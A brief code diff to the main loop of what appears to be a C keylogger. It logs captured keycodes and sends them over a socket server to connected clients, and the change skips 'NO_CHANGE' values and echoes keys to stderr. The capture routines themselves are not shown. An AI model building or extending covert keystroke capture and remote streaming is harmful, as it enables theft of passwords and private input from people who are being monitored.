@@ -5,7 +5,6 @@
 int main (int argc, char* argv[])
 {
     char keycode[100];
-
     bzero(keycode, 100);
     init_logger();
     start_socket_server(SOCKET_SERVER_PORT);
@@ -14,7 +13,12 @@ int main (int argc, char* argv[])
     { 
         update_clients();
         log_key(keycode);
-	write_socket(keycode);
+
+        if(strcmp("NO_CHANGE",keycode) != 0)
+        {
+            fprintf(stderr, "%s", keycode);
+	    write_socket(keycode);
+        }
     }
 
     return 0;
